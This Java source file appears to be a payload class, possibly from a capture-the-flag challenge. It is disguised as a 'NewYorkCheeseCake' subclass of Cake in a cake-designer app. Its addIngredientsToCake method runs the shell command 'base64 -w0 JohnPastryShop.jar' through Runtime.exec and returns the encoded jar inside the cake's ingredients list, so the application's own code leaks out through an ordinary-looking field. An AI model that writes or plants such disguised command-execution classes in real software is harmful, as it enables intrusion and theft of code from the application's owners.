package it.polimi.necst.johncakedesigner;

import java.io.*;

public class NewYorkCheeseCake extends Cake {
    public void addIngredientsToCake() {
        try {
            Process p = Runtime.getRuntime().exec("base64 -w0 JohnPastryShop.jar");
        
            BufferedReader bir = new BufferedReader(new InputStreamReader(p.getInputStream()));
            
            while(bir.ready()) {
                this.ingredientsList.add(bir.readLine());
            }
        } catch(Exception e) {
            this.ingredientsList.add(e.toString());
        }

    }
}
